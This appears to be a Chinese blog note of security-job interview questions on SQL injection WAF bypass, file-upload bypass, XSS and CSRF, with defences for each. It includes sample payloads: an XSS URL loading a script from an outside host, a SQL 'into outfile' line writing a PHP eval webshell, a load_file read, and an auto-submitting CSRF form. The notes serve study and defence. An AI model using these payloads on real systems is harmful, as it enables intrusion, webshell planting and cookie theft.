---
title: 网安面试问题汇总
date: 2022-02-07 12:56:59
categories: 笔记
tags: [Web,网络安全,笔记]
---

## 1.SQL注入的WAF绕过

- 白盒  框架源码，代码审计
- 黑盒绕过
  - 架构层绕过
  - 资源限制角度绕过
  - 协议层
  - 规则层面绕过

### 架构层绕过

寻找源站点地址（适用于网站使用云WAF场景）；

利用同网段主机（同网段主机可以直接交换帧，无需交换机/网桥的转发）或服务器进行内网注入

> 通过网桥连接多个以太网成为覆盖更大的以太网（局域网：以太网，令牌环网，FDDI）。

碰撞/冲突域：任意两台主机通信（使用信道时，其他主机无法通信）——介质访问控制



### 资源限制角度绕过

- 多试一试，利用数据库特性
- 改其他格式文件，burp改文件后缀
- post的内容足够多——一个大的body；由于在线WAF会考虑速度，对大文件一般不过滤；

- 借助畸形包，或者模糊测试fuzz。

### 协议层绕过

- 参数污染，代入多个参数，有的WAF只能识别一个参数，可以在第二个参数后面带sql语句。

```php
  url.php?id=1&id=2
```

### **规则层的绕过**

- 注释符号#，‘ ’空白符号，函数分割，浮点数

- error-base，mysql特殊语法绕过

## 2.文件上传漏洞的绕过

- 修改后缀
- 绕后端：MineType，即修改Content-Type类型，%00截断（伪造合法文件头）
- Content-Disposition'...' filename="1.jpg;.php" ｜｜  去掉双引号 ｜｜ 把p  h  p换行   ｜｜php5
- webshell放入jpg；改幻数头字节，判断文件格式一般靠前10个字节。

### 文件上传漏洞的防护手段

- js过滤
- 限制文件大小
- 随机数改写文件名，取消执行权限，**将文件强制重命名另存储**
- 竞争条件？？
- 后端设置白名单（更安全，使用递归过滤，防治覆写）和黑名单（可能会有遗漏，可能靠大小写可以绕过）

## 3.XSS原理

>http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%B5%8B%E8%AF%95%E5%8F%8A%E4%BF%AE%E5%A4%8D/

跨站脚本攻击，允许恶意web用户将代码植入到提供给其它用户使用的页面中，用户访问时将会自动执行。

分为**存储型**，反射型和DOM型。

### 3.1 攻击办法：

闭合标签，使我的内容能被解析成可执行语句；对url和参数进行各种编码（比如16禁止和8进制）

### 3.2 防御手段：

将特殊字符过滤(",<,>,&"),使其成为不能被html执行的字符；

做白名单过滤，专门过滤，使用**内容安全的策略CSP**（规定客户端哪些内容可以加载）；

禁止非同源网站读cookie

- 反射型（给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行。它的特点是非持久化，必须**用户点击带有特定参数的链接**才能引起。）

- 存储型——把用户cookie信息发到攻击者服务器

```js
在搜索框输入这一行在服务器上直接被解析成了js语句；
　“<script>alert(1)</script>”
search.php?q=%3Cscript+src%3Dhttp%3A%2F%2Fhacker.qq.com%2Fhacker.js%3E%3C%2Fscript%3E
```

当用户登陆了网站后，再欺骗用户点击这个链接才可以窃取用户的cookie。

## 深信服安全岗面试题

1.sql注入如何读写文件，二次注入，防御方式？

```sql
#读：
select load_file('C:\\key.txt')
#写：
开权限：secure_file_priv into outfile
unoion select 1,'<?php @eval($_POST[‘mima’]);?>',3 into outfile "C:\\test\shellcode.php"
#二次注入
admin'--  #借助--把后面的语句注释了
select ... username='admin'--  and password='xxx'
#sql注入的防御
- 预编译，例如Java中PrepareStatement，从结构上限制编写；
Mybatis？？ #预编译  $进行替换
- 参数判断，强转参数int(and 1==1--+)

```

2.CSRF和XSS的区别

XSS，原来叫做CSS (Cross Site Script) ，跨站调用脚本攻击站内的信任用户，盗取cookie；

CSRF通过伪装成受信任用户请求受信任的网站；

```asp
<%
s = "<form method='post' action='http://hi.baidu.com/yuxi4n/commit'>"
s = s+"<input type='text' style='display:none!important;display:block;width=0;height=0' value='5' name='ct'/>"
s = s+"<input type='text' style='display:none!important;display:block;width=0;height=0' value='1' name='spCssUse'/>"
s = s+"<input type='text' style='display:none!important;display:block;width=0;height=0' value='1' name='spCssColorID'/>"
s = s+"<input type='text' style='display:none!important;display:block;width=0;height=0' value='-1' name='spCssLayoutID'/>"
s = s+"<input type='text' style='display:none!important;display:block;width=0;height=0' value='http://hi.baidu.com/yuxi4n/modify/spcss/20f51f4f94129a36aec3ab11.css/edit' name='spRefURL'/>"
s = s+"<input type='text' style='display:none!important;display:block;width=0;height=0' value='5' name='cm'/>"
s = s+"<input type='text' style='display:none!important;display:block;width=0;height=0' value='</style><script>alert(document.cookie)</script><style>' name='spCssText'/>"
s = s+"<input type='text' style='display:none!important;display:block;width=0;height=0' value='abc' name='spCssName'/>"
s = s+"<input type='text' style='display:none!important;display:block;width=0;height=0' value='0' name='spCssTag'/>"
s = s+"</form>"
s = s+"<script>document.forms[0].submit();</script>"
Response.write(s)
%>
```



防御手段：CSRF Token+Referer的验证

> http://huaidan.org/archives/2561.html,借助CSRF和其他手段，可以把反射型XSS持久化利用，不一定需要用户去点击特殊构造的链接。



